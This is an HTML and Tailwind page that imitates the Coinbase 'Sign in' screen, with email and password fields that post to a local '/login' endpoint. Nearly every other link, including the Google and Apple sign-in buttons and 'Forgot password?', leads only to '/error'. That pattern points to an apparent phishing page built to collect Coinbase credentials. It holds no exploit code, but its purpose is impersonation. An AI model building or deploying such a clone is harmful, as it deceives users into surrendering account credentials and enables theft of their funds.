<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Coinbase</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        body {
            font-family: 'Inter', system_ui, sans-serif;
        }
        
        .coinbase-logo {
            font-family: 'Inter', sans-serif;
            font-weight: 700;
            letter-spacing: -0.05em;
        }
        
        .input-focus {
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .input-focus:focus {
            border-color: #0052FF;
            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.2);
        }
        
        .tail-bg {
            background: linear-gradient(145deg, #f8f9fa, #ffffff);
        }
    </style>
</head>
<body class="bg-white min-h-screen flex flex-col">
    <!-- Top bar -->
    <header class="border-b border-gray-200 bg-white">
        <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
            <div class="flex items-center gap-x-8">
                <!-- Logo -->
                <div onclick="window.location.reload()" class="flex items-center cursor-pointer">
                    <img src="/coinbase-logo.png" alt="Logo" class="h-8 w-8 object-contain">
                </div>
            </div>
            
            <div class="flex items-center gap-x-6 text-sm font-medium text-gray-600">
                <a href="/error" class="hover:text-black transition-colors">Products</a>
                <a href="/error" class="hover:text-black transition-colors">Markets</a>
                <a href="/error" class="hover:text-black transition-colors">Learn</a>
                <a href="/error" class="hover:text-black transition-colors">Support</a>
                <div class="h-5 w-px bg-gray-300"></div>
                <div class="relative">
                    <button onclick="document.getElementById('langDropdown').classList.toggle('hidden')" 
                            class="flex items-center gap-x-1 hover:text-black transition-colors">
                        <span>üåê</span>
                        <span id="currentLang">English</span>
                        <i class="fas fa-chevron-down text-xs"></i>
                    </button>
                    <div id="langDropdown" class="hidden absolute right-0 mt-2 w-40 bg-white border border-gray-200 rounded-xl shadow-lg z-50 py-1">
                        <a href="#" onclick="setLang('English')" class="block px-4 py-2 text-sm hover:bg-gray-100">English</a>
                        <a href="#" onclick="setLang('Espa√±ol')" class="block px-4 py-2 text-sm hover:bg-gray-100">Espa√±ol</a>
                        <a href="#" onclick="setLang('Fran√ßais')" class="block px-4 py-2 text-sm hover:bg-gray-100">Fran√ßais</a>
                        <a href="#" onclick="setLang('Deutsch')" class="block px-4 py-2 text-sm hover:bg-gray-100">Deutsch</a>
                        <a href="#" onclick="setLang('Êó•Êú¨Ë™û')" class="block px-4 py-2 text-sm hover:bg-gray-100">Êó•Êú¨Ë™û</a>
                        <a href="#" onclick="setLang('‰∏≠Êñá')" class="block px-4 py-2 text-sm hover:bg-gray-100">‰∏≠Êñá</a>
                        <a href="#" onclick="setLang('Portugu√™s')" class="block px-4 py-2 text-sm hover:bg-gray-100">Portugu√™s</a>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Main content -->
    <div class="flex-1 flex items-center justify-center tail-bg py-12 px-6">
        <div class="w-full max-w-md">
            <!-- Card -->
            <div class="bg-white rounded-3xl shadow-2xl border border-gray-100 overflow-hidden">
                <!-- Header -->
                <div class="px-10 pt-10 pb-6 text-center">
                    <div class="flex justify-center mb-6">
                        <img src="/coinbase-logo.png" alt="Coinbase" class="h-16 w-16 object-contain">
                    </div>
                    <h1 class="text-3xl font-semibold text-[#0A0B0D] tracking-tight">Sign in to Coinbase</h1>
                    <p class="text-gray-500 mt-2 text-sm">Welcome back! Please sign in to continue.</p>
                </div>

                <!-- Form -->
                <form id="loginForm" action="/login" method="POST" class="px-10 pb-10 space-y-6">
                    <!-- Email -->
                    <div>
                        <label class="block text-xs font-medium text-gray-500 mb-1.5 tracking-widest">EMAIL OR PHONE NUMBER</label>
                        <input id="email" 
                               name="email"
                               type="text" 
                               placeholder="you@example.com"
                               class="input-focus w-full px-5 py-4 bg-white border border-gray-300 rounded-2xl text-base focus:outline-none text-[#0A0B0D]"
                               required>
                    </div>

                    <!-- Password -->
                    <div>
                        <div class="flex justify-between items-center mb-1.5">
                            <label class="text-xs font-medium text-gray-500 tracking-widest">PASSWORD</label>
                            <a href="/error" class="text-[#0052FF] text-sm font-medium hover:underline">Forgot password?</a>
                        </div>
                        <div class="relative">
                            <input id="password" 
                                   name="password"
                                   type="password" 
                                   placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                                   class="input-focus w-full px-5 py-4 bg-white border border-gray-300 rounded-2xl text-base focus:outline-none text-[#0A0B0D] pr-12"
                                   required>
                            <button type="button" onclick="togglePassword()" 
                                    class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                                <i id="eyeIcon" class="fas fa-eye text-xl"></i>
                            </button>
                        </div>
                    </div>

                    <!-- Submit -->
                    <button type="submit"
                            id="submitBtn"
                            class="w-full bg-[#0052FF] hover:bg-[#0039CC] transition-colors text-white font-semibold py-4 rounded-2xl text-lg shadow-lg shadow-[#0052FF]/30 flex items-center justify-center gap-x-2">
                        Sign in
                    </button>

                    <!-- Divider -->
                    <div class="relative flex items-center py-4">
                        <div class="flex-1 h-px bg-gray-200"></div>
                        <span class="px-6 text-xs font-medium text-gray-400 tracking-widest">OR</span>
                        <div class="flex-1 h-px bg-gray-200"></div>
                    </div>

                    <!-- Google -->
                    <a href="/error" class="w-full border border-gray-300 hover:border-gray-400 transition-colors rounded-2xl py-4 flex items-center justify-center gap-x-3 text-base font-medium no-underline text-[#0A0B0D]">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/2048px-Google_%22G%22_logo.svg.png" 
                             alt="Google" class="w-5 h-5">
                        Continue with Google
                    </a>

                    <!-- Apple -->
                    <a href="/error" class="w-full border border-gray-300 hover:border-gray-400 transition-colors rounded-2xl py-4 flex items-center justify-center gap-x-3 text-base font-medium no-underline text-[#0A0B0D]">
                        <i class="fab fa-apple text-2xl"></i>
                        Continue with Apple
                    </a>
                </form>
            </div>

            <!-- Footer links -->
            <div class="mt-8 text-center">
                <p class="text-sm text-gray-500">
                    New to Coinbase? 
                    <a href="/error" class="text-[#0052FF] font-medium hover:underline">Create an account</a>
                </p>
            </div>

            <div class="mt-12 text-center text-[10px] text-gray-400 space-x-4">
                <a href="/error" class="hover:text-gray-600">Privacy</a>
                <a href="/error" class="hover:text-gray-600">Terms</a>
                <span>¬© 2026 Coinbase, Inc.</span>
            </div>
        </div>
    </div>

    <script>
        // Tailwind script already loaded via CDN
        
        function togglePassword() {
            const pass = document.getElementById('password');
            const icon = document.getElementById('eyeIcon');
            if (pass.type === 'password') {
                pass.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                pass.type = 'password';
                icon.classList.add('fa-eye');
                icon.classList.remove('fa-eye-slash');
            }
        }
        
        function setLang(lang) {
            document.getElementById('currentLang').textContent = lang;
            document.getElementById('langDropdown').classList.add('hidden');
        }

        document.addEventListener('click', function(e) {
            const dropdown = document.getElementById('langDropdown');
            const btn = dropdown.previousElementSibling;
            if (!dropdown.contains(e.target) && !btn.contains(e.target)) {
                dropdown.classList.add('hidden');
            }
        });

        window.onload = () => {
            document.getElementById('email').focus();
        };
    </script>
</body>
</html>
